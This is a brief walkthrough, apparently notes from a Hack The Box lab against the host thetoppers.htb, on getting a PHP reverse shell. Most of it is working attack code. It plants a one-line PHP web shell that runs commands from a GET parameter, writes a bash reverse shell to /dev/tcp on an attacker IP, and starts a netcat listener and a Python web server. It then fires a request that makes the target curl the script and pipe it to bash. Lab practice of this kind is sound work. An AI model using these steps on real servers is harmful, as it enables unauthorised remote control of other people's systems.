## Php reverse shell

First we find a way of injecting a file on the remote server that allows us execture commands, for example:

	<?php system($_GET["cmd"]); ?>

Then create the revershell file:

	#!/bin/bash
	bash -i >& /dev/tcp/<YOUR_IP_ADDRESS>/1337 0>&1

Then we start a server listing on our machine:

	nc -nvlp 1337

And ont the same directory of the reverse shell file we start a web server to serve that file:

	python3 -m http.server 8000

Now we connect to our serve:

	http://thetoppers.htb/shell.php?cmd=curl%20<YOUR_IP_ADDRESS>:8000/shell.sh|bash

And We receive a reverse shell on the corresponding listening port.
